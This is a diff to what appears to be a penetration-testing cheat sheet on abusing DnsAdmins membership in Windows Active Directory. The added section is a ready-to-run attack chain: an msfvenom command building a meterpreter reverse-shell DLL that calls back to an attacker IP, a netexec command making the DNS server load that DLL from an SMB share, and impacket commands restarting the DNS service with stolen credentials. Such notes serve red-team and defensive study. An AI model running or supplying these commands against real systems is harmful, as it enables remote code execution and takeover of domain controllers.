@@ -73,3 +73,18 @@
 ## Alternate Method: Metasploit
 
     use exploit/windows/local/dnsadmin_serverlevelplugindll
+
+## Alternate Method: Netexec and python
+
+#### Generate the DLL
+
+    msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=1234 -f dll > rev.dll
+
+#### On the DNS machine, modify the server conf
+
+    nxc smb <target> -u user1 -p password -X "dnscmd.exe /config /serverlevelplugindll \\<share_SMB>\rev.dll"
+
+#### Restart DNS
+
+    services.py 'domain.local'/'user1':'password'@<DNS_server> stop dns
+    services.py 'domain.local'/'user1':'password'@<DNS_server> start dns
